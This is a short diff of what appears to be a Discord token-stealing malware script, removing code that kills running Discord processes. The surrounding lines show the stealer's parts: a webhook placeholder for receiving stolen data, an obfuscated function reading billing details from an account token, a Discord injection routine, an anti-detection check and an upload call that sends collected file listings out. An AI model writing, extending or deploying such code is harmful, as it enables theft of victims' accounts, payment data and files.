@@ -16,7 +16,7 @@ import re
 import subprocess
 import sys
 import shutil
-import psutil
+
 
 
 hook = "WEBHOOK HERE"
@@ -200,10 +200,6 @@ def G3tb1ll1ng(t0k3n):
     return b1ll1ng
 
 def inj_discord():
-    PROCNAME = "Discord"
-    for proc in psutil.process_iter():
-        if proc.name().startswith(PROCNAME):
-            proc.kill()
 
     username = os.getlogin()
 
@@ -982,4 +978,3 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
-
